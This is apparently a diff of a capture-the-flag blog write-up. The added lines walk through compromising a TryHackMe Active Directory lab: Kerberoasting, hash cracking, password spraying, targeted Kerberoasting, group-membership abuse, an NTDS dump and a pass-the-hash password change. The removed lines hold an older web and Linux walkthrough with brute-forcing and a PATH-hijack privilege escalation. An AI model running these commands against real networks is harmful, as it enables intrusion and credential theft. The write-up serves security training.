@@ -7,7 +7,9 @@ tags: [Targeted_Kerberosting, GenericWrite, writeowner, ntds_dump]
 ---
 
 
-![opendgame](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Operation-Endgame-img.png)
+![opendgame](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Operation-Endgame-img.png){:width="50%"} 
+
+- Operation Endgame is an Active Directory–focused room on TryHackMe that simulates a real-world enterprise network environment. The objective is to perform a full penetration testing workflow, starting from initial enumeration and gaining a foothold, to privilege escalation and ultimately achieving domain dominance. The room emphasizes practical skills such as service enumeration, credential attacks, Active Directory abuse techniques, and attack path analysis using tools like BloodHound, providing a realistic red team experience.
 
 ## Nmap Result
 
@@ -80,10 +82,10 @@ tags: [Targeted_Kerberosting, GenericWrite, writeowner, ntds_dump]
 nxc smb <IP> -u '' -p '' --rid-brute
 ```
 
-- by running this we can get the users list and we can try ASEP-Kerbestoing
+- By running the above command we can get the users list so we can try ASEP-Kerbestoing
 
 ```bash
-GetNPUsers.py thm.local/ -dc-ip 10.48.182.234 -usersfile Users.txt -no-pass
+GetNPUsers.py thm.local/ -dc-ip <IP> -usersfile Users.txt -no-pass
 ```
 
 ## Got some hashes
@@ -101,12 +103,15 @@ $krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:4692a29239f877941cf3b036d2b2e035$a220a7d2
 
 ```
 
-- I tried hashing these but i can't
+- I tried cracking these hashes but i can't
 
-## Kerberosting
+## Kerberoasting
 
-![[Pasted image 20260405105427.png]]
+![Guest](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/guest-image.png)
 - Guest account is authenticated.
+
+Kerberoasting is an Active Directory attack technique where an attacker requests service tickets (TGS) for accounts with Service Principal Names (SPNs) and extracts them for offline password cracking. Since these tickets are encrypted using the service account’s password hash, weak passwords can be cracked to recover credentials, which can then be used for privilege escalation within the domain.
+
 ```
 nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerb.txt
 ```
@@ -117,40 +122,59 @@ nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerb.txt
 $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$f76a19aaac17856b69718fa2dfbee421$ee7a9831221581c7867c8f18d49286b572c124e690ab6aa24c6f379e755ffbd527ba4abc5a6b56b69e2f08481b6c6d63a404a3960e39c1f29f5a45480bdb6912e82b50455e03efecb79acc6bfb36889e095bd43de0ad1ac243199100ae1a04886885888c91299872802173c192166bc8bd86f78bc5cae7b207c802bc27f369ed8500548ad30e3e3136fc3f6aec0f5aeb2e16bc4fb8eb9fc0dc7feb327dafc2e1f8e4127b60f017151aa23948c36e58e7ad794ee85d1edf3982ebf707affe62fed68c3e72083b1cf1e9440a906728507087668a0507078352b2aaaa43c020a4b31214282fa43618e211c65d17ab77024976eaca9c708c694d57c4434e209dbc851c1290290d57b8d0cad9fa043ae808d2b5fd8fa9b69f8b27b685b741aad2683c63da9499c7e42eb9d0b7fd1bd2f11093114db2669e078f1d8e364cadb21f659e9a4ccd7bd38180d9d537d3587121d28db9a1d59089538a74e88d090574373aa096d5a57cae875dfb6e29deb85409e483e20703ec8df5bf5b58a21d9177942494fc89d60121ab9e23eb423daca249f74f94dd512e602bc8f0f3ed5864e6707b260490ec3f38ff6927916a2bcb0968b0b422cfe7040ea01601c0ae7a91fa38736a8aa710a097b2b6e2511d267577b9a4f7ff90934cca5107dad003d3ec164c5293439f26323e78281f08cfd9eacc1969c0f837198d2369e8164ca4b89e4345bae5f6cee4824f3d42b664e02cd241bbaa3b21ce7d1a03034b62697d59e6c8feb897c2f0437ac064e11f2b1c738b0d42ab91189097ebe7df21374823ca959f43fa348cf2cd45cb3e697215bb471cb9b215f4d71843ba6ee6b34289ead1f83e8978bec7e404803780b58a9e3b00167506b9f175e76bedb40081a44f5a3ade7723eba30bd906f0d8e6c651fa24a231fe4236597376f7351a3451f5bb2724e398f51a0ab239a7723c5a2f632b04ccbb7f0aeb972762ea731455e4f632174326367052cc0a63165311221a6cc9847bca38f9e36449c3ead5ae8bbee03b1e7f719451518c795e530a62bce5059a4ef6cf491fa0a37565438c8b7bcf228b779ac907b2bd8cef3fac242e0ee9c3b97123b392c8d79236254c1281fa5102f9029f8efcf631b6163197379cc1282317abbd86d1007a4c8caf481bd34068e60bde0e722996fe18aa0d4db8ec27695f96b825fbe98c8843b7c95a46d4d7afee214605b18d17459721070dc92070a54e1445783d897d1efa58decf732386375dd1f76e336507c1e24cb26c8358357550debce6e3256cfdf3f3cda9c00bc17d63dd45f940995f9a4884e06c03f03aec8707a61656dad5a5bffeb872fe66931ed501992b41a15de31c6294ecde362de13776031b15638e4f199d6e026026bcdac5b6e3ed0afe9678
 ```
 
+### Cracking the hash
+
+```bash
+hashcat -m 13100 hash.txt rockyou.txt
+```
+
 ```
 Cracked the hash
 CODY_ROY:MKO)mko0
 ```
 
-![[Pasted image 20260405110424.png]]
+![Cody-img](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Cody-img.png)
 
-![[Pasted image 20260405143859.png]]
+- Cody's credentials are valid. 
+
+- We got a valid password so we can try passwordspray attack to check whether the password is reused using kerbrute.
+
+Kerbrute is a tool used for enumerating valid usernames and performing password attacks against Active Directory using the Kerberos protocol. It works by sending authentication requests to the domain controller and analyzing the responses to identify valid users without triggering typical account lockout policies. Kerbrute is commonly used for user enumeration and password spraying during the initial stages of an Active Directory penetration test.
+
+![Kerbrute](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/kerbrute.png)
+
 - Two users has same password.
 
-![[Pasted image 20260405161618.png]]
+## Visuallizing the attack vectors using bloodhound
 
-- We have generic write over Jerri_lancaster so we can Target kerberoast.
+![GenericWrite](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/GenericWrite.png)
+
+- We have generic write over Jerri_lancaster from Zachary so we can try Targeted kerberoasting.
+
+```bash
+targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p '<Zachary-Password>' --dc-ip <Machine-IP>
+```
 - 
-![[Pasted image 20260405162620.png]]
+![Targeted-kerb](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Targeted-kerb.png)
 
 ```
-JERRI_LANCASTER:lovinlife!
+JERRI_LANCASTER:<Jerri-Password>
 ```
 
-![[Pasted image 20260405162746.png]]
+![WriteOwner](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/WriteOwner.png)
 
-![[Pasted image 20260405163640.png]]
-- Have writeOwner access towards Reader Admins
+- Have writeOwner access towards Reader Admins so we can add the Jerri user into the Reader Admins group.
+
 ## Adding the user to the group
 
 ```
-net rpc group addmem "READER ADMINS" "JERRI_LANCASTER" -U "thm.local"/'JERRI_LANCASTER'%'lovinlife!' -S "10.49.138.51"
+net rpc group addmem "READER ADMINS" "JERRI_LANCASTER" -U "thm.local"/'JERRI_LANCASTER'%'<Jerri-Password>' -S "<DC-IP>"
 ```
 
 - Verifying
 
 ```
-net rpc group members "READER ADMINS" -U "thm.local"/'JERRI_LANCASTER'%'lovinlife!' -S "10.49.138.51" 
+net rpc group members "READER ADMINS" -U "thm.local"/'JERRI_LANCASTER'%'<Jerri-Password>' -S "<DC-IP> 
 THM\JERRI_LANCASTER
 ```
 
@@ -158,145 +182,24 @@ THM\JERRI_LANCASTER
 
 ## Found Creds for SANFORD_DAUGHERTY domain admin
 
-![[Pasted image 20260405164355.png]]
+![Sanford-cred](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Sanford-cred.png)
 ```
-SANFORD_DAUGHERTY:RESET_ASAP123
+SANFORD_DAUGHERTY:<Sanford-Password>
 ```
 
 ## Dumping NTDS.dit
 
-![[Pasted image 20260405165423.png]]
+![ntds](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/ntds.png)
 
 ## Changed the password of the administrator and RDP as the user and got flag
 
 ```
-nxc smb thm.local -u administrator -H "e599bf2fe56d6a21b3a5487bb4761d1b" -M change-password -o NEWPASS=Password@123
+nxc smb thm.local -u administrator -H "<Admin's Hash>" -M change-password -o NEWPASS=Password@123
 ```
 
-![[Pasted image 20260405170444.png]]
+![admin](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/admin.png)
 
-![[Pasted image 20260405170508.png]]
-
-
-# Enumeration
-
-## HTTP(80)
-
-### Dirsearch
-
-
-```bash
-dirsearch -h http://lookup.thm
-
-[14:33:07] 403 -  275B  - /.php                                             
-[14:33:59] 200 -    1B  - /login.php                                        
-[14:34:16] 403 -  275B  - /server-status                                    
-[14:34:16] 403 -  275B  - /server-status/
-
-```
-
-## Website Features
-- Login page
-
-![Login](https://c00lrabbit.github.io/assets/Images/Lookup/Login-page.png)
-
-- I tried injection attacks, Intercepted the traffic and Analyzed but no use.
-
-#### Using ffuf we can try bruteforcing the login
-
-```bash
-ffuf -w /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -fw 8 
-```
-![ffuf password ](https://c00lrabbit.github.io/assets/Images/Lookup/ffuf-password.png)
-
-But this password doesn't login so i enumerated the username
-
-```bash
- ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-username.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=password123' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8 
-```
-
-![ffuf uname](https://c00lrabbit.github.io/assets/Images/Lookup/ffuf-uname.png)
-
-- After we login with the correct credentials we get into `files.lookup.thm` vhost.
-- There is a service running on this vhost named "elFinder".
-
-![elfinder dashboard](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-hpage.png)
-
-- Found the version of the elFinder
-
-![elfinder version info](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-info.png)
-
-# Exploitation
-
-- This version is vulnerable to php command injection which leads to RCE.
-- We found a Exploit from Exploit-DB https://www.exploit-db.com/exploits/46481
-
-![exploit sshell](https://c00lrabbit.github.io/assets/Images/Lookup/exploit-shell.png)
-
-We can upgrade this into interactive shell using Reverse shell.com
-![rev-shell](https://c00lrabbit.github.io/assets/Images/Lookup/revshell-generator.png)
-
-- After running linpeas we found a SUID
-![linpeas-suid](https://c00lrabbit.github.io/assets/Images/Lookup/linpeas-SUID.png)
-
-- Running pwm binary
-
-![pwm-binary](https://c00lrabbit.github.io/assets/Images/Lookup/pwm-binary.png)
-
-## Analysing the binary
-- When we run this binary it executes `id` command and from the result it search for a .password file under the user.
-
-```bash
-cd /tmp
-echo '#!/bin/bash' > id
-echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
-chmod +x id
-export PATH=/tmp:$PATH
-/usr/sbin/pwm
-```
-### Breakdown of the above commands
-- We are redirecting to `/tmp` because `/tmp` directory have mostly read and write access.
-- Creating a shell script named 'id' we are echoing the commands into the file 'id'.
--  Adding Execution privilege to the script and exporting `/tmp` dir to PATH, Here comes the intresting part in linux when we are running a command or file it first check the location of the file form the PATHS list so here we are adding the `/tmp` which makes the `/usr/sbin/pwm` script to run our malicious 'id' script.
-- Our script will output like the think user and we can read the /home/think/.passwords file Because the pwm script thinks we are 'think' user.
-
-- After running the above line we get this password list
-
-```
-jose1006
-jose1004
-jose1002
-jose1001teles
-jose100190
-jose10001
-jose10.asd
-jose10+
-....
-
-```
-
-- Using hydra we can bruteforce the login
-
-```bash
-hydra -l think -P password.txt ssh://lookup.thm -t 40 -v
-```
-![hydra-out](https://c00lrabbit.github.io/assets/Images/Lookup/hydra-out.png)
-
-# Privilege Escalation
-
-- Using the found credentials we can ssh into the machine.
-```
-ssh think@lookup.thm
-```
-
-- After running `sudo -l` we found that we have access to "look" with sudo.
-- After search in GTFO bins [Click Here](https://gtfobins.github.io/gtfobins/look/#sudo) we found a bypass.
-
-![GTFO-Bins](https://c00lrabbit.github.io/assets/Images/Lookup/gtfo-bin.png)
-
-- We got the root
-
-![root](https://c00lrabbit.github.io/assets/Images/Lookup/Root.png)
+![final](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Final.png)
 
 
 ## Conclusion
